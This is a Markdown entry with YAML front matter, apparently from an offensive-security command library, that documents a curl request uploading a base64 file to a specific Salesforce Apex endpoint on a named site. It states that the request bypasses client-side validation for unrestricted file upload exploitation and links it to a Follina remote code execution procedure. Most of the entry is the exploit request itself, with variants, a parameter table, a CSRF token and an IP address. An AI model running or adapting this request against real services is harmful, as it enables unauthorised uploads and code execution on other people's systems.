---
id: cmd-curl-salesforce-upload
data: >-
  curl -X POST https://reddit.secure.force.com/adhelp/apexremote -H
  "Content-Type: application/json" -H "Host: reddit.secure.force.com" -d
  '{"action":"AdvertisingHelpController","method":"uploadFile","data":["BASE64_ENCODED_DOCX_CONTENT","","Dummy
  Data.docx","5005c000017FCu8AAG","118.70.7.113"],"type":"rpc","tid":3,"ctx":{"csrf":"VmpFPSxNakF5TWkwd05pMHlNMVF3T0Rvek1qb3lOQzQ0TURCYSxPeVQ1SlZBcnRoajJZQlJFKVc3QVlvLE5HVXhPRGN6","vid":"0661J000003FS4V","ns":"","ver":41}}'
tags:
  - http
  - upload
  - exploit
type: command
output: '{"statusCode":200,"result":"00P5c00001leROKEA2"}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.269Z'
verified: false
validated: true
submitted: true
---
# curl-http-post-upload

## Command

```bash
curl -X POST https://reddit.secure.force.com/adhelp/apexremote -H "Content-Type: application/json" -H "Host: reddit.secure.force.com" -d '{"action":"AdvertisingHelpController","method":"uploadFile","data":["BASE64_ENCODED_DOCX_CONTENT","","Dummy Data.docx","5005c000017FCu8AAG","118.70.7.113"],"type":"rpc","tid":3,"ctx":{"csrf":"VmpFPSxNakF5TWkwd05pMHlNMVF3T0Rvek1qb3lOQzQ0TURCYSxPeVQ1SlZBcnRoajJZQlJFKVc3QVlvLE5HVXhPRGN6","vid":"0661J000003FS4V","ns":"","ver":41}}'
```

## Description

This curl command sends a JSON RPC POST request to the Salesforce Apex endpoint to upload a base64-encoded file, bypassing client-side validation for unrestricted file upload exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Host: reddit.secure.force.com"` | Target host header | Yes |
| `-d '{...}'` | JSON payload with action, method, data array (base64 file, empty, filename, record ID, IP), type, tid, ctx (csrf, vid, ns, ver) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://reddit.secure.force.com/adhelp/apexremote -H "Content-Type: application/json" -d '{"action":"AdvertisingHelpController","method":"uploadFile","data":["BASE64_CONTENT","","test.docx","ID","IP"],"type":"rpc","tid":3,"ctx":{"csrf":"TOKEN","vid":"VID","ns":"","ver":41}}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://reddit.secure.force.com/adhelp/apexremote -H "Content-Type: application/json" -d '{...}'
```

## Expected Output

Successful response: HTTP/1.1 200 OK followed by JSON {"statusCode":200,"result":"00P5c00001leROKEA2"}, indicating upload success and file ID.

## Related

- [[procedures/Bypass-Client-Side-Validation-for-Malicious-File-Upload]]
- [[Unrestricted File Upload on Salesforce Leading to Follina RCE]]
